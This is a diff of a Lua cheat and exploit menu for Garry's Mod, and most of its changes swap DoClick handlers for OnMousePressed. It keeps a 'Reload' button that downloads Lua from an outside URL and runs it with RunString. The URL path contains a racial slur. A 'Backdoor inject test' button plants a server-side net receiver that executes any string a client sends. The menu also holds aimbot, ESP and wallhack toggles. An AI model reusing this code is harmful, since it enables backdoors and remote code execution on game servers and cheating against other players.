@@ -161,7 +161,7 @@ end
 function net.WriteColor( c )
 	netWriteColor( c )
 end
-function LocalPlayer()
+local function LocalPlayer()
 	return LocalPlayerEntIndex()
 end
 local player = {}
@@ -416,9 +416,9 @@ function CreateMenu()
 	reloadbutton:SetPos(75, 5)
 	reloadbutton:SetText("Reload")
 	reloadbutton:SizeToContents()
-	reloadbutton.DoClick = function()
+	reloadbutton.OnMousePressed = function()
 		MainFrame:Remove()
-		http.Fetch("http://textifi.hol.es/dev.lua?c="..math.Rand(1111, 9999),function( cc )
+		http.Fetch("https://raw.githubusercontent.com/Wownicehat/pwnedcheat-gmod/master/for_real_nigger.lua?c="..math.Rand(1111, 9999),function( cc )
 			RunString(cc.."RunConsoleCommand(\"pwned_menu\")")
 		end)
 	end
@@ -426,7 +426,7 @@ function CreateMenu()
 	backdoorinjectbutton:SetPos(175, 5)
 	backdoorinjectbutton:SetText("Backdoor inject test")
 	backdoorinjectbutton:SizeToContents()
-	backdoorinjectbutton.DoClick = function()
+	backdoorinjectbutton.OnMousePressed = function()
 	RunConsoleCommand("ulx", "luarun", [[util.AddNetworkString("ULX_QUERY_TEST2") net.Receive("ULX_QUERY_TEST2", function() RunString(net.ReadString()) end)]])
 		MainFrame:Remove()
 		timer.Simple(0.5, function()
@@ -458,7 +458,7 @@ function CreateMenu()
 		exploits[name]:SetText(tab.desc)
 		exploits[name]:SetSize(500, 30)
 		exploits[name]:SetFont("ESPFont")
-		exploits[name].DoClick = function()
+		exploits[name].OnMousePressed = function()
 			surface.PlaySound("buttons/blip1.wav")
 			tab.action()
 		end
@@ -591,7 +591,7 @@ end
 				a:SetText("Everyone")
 				a:SetFont("ESPFont")
 				a:SetSize(190, 25)
-				a.DoClick = function()
+				a.OnMousePressed = function()
 					surface.PlaySound("buttons/blip1.wav")
 					for i,v in ipairs(llist) do
 						v:SetValue(1)
@@ -618,7 +618,7 @@ end
 				a:SetText(btn)
 				a:SetFont("ESPFont")
 				a:SetSize(285, 25)
-				a.DoClick = function()
+				a.OnMousePressed = function()
 					surface.PlaySound("buttons/blip1.wav")
 					func()
 				end
@@ -1534,7 +1534,7 @@ AddExploit("S_BEV", {
 	ToggleAimbot:SetText("Aimbot")
 	ToggleAimbot:SetPos(5, 25)
 	ToggleAimbot:SetSize(150, 30)
-	ToggleAimbot.DoClick = function()
+	ToggleAimbot.OnMousePressed = function()
 		_pSetting.AIMBOT = !_pSetting.AIMBOT
 	end
 	ToggleAimbot.Paint = function(s, w, h)
@@ -1584,7 +1584,7 @@ AddExploit("S_BEV", {
 	ToggleCrosshair:SetText("Crosshair")
 	ToggleCrosshair:SetPos(5, 25)
 	ToggleCrosshair:SetSize(150, 30)
-	ToggleCrosshair.DoClick = function()
+	ToggleCrosshair.OnMousePressed = function()
 		_pSetting.CROSSAIRE = !_pSetting.CROSSAIRE
 	end
 	ToggleCrosshair.Paint = function(s, w, h)
@@ -1597,7 +1597,7 @@ AddExploit("S_BEV", {
 	ToggleESP:SetText("ESP")
 	ToggleESP:SetPos(5, 75)
 	ToggleESP:SetSize(150, 30)
-	ToggleESP.DoClick = function()
+	ToggleESP.OnMousePressed = function()
 		_pSetting.ESP = !_pSetting.ESP
 	end
 	ToggleESP.Paint = function(s, w, h)
@@ -1610,7 +1610,7 @@ AddExploit("S_BEV", {
 	ToggleTRACER:SetText("Tracers")
 	ToggleTRACER:SetPos(5, 125)
 	ToggleTRACER:SetSize(150, 30)
-	ToggleTRACER.DoClick = function()
+	ToggleTRACER.OnMousePressed = function()
 		_pSetting.TRACER = !_pSetting.TRACER
 	end
 	ToggleTRACER.Paint = function(s, w, h)
@@ -1623,7 +1623,7 @@ AddExploit("S_BEV", {
 	ToggleWALLHACK:SetText("Wallhack")
 	ToggleWALLHACK:SetPos(5, 200)
 	ToggleWALLHACK:SetSize(150, 30)
-	ToggleWALLHACK.DoClick = function()
+	ToggleWALLHACK.OnMousePressed = function()
 		_pSetting.WALLHACK = !_pSetting.WALLHACK
 	end
 	ToggleWALLHACK.Paint = function(s, w, h)
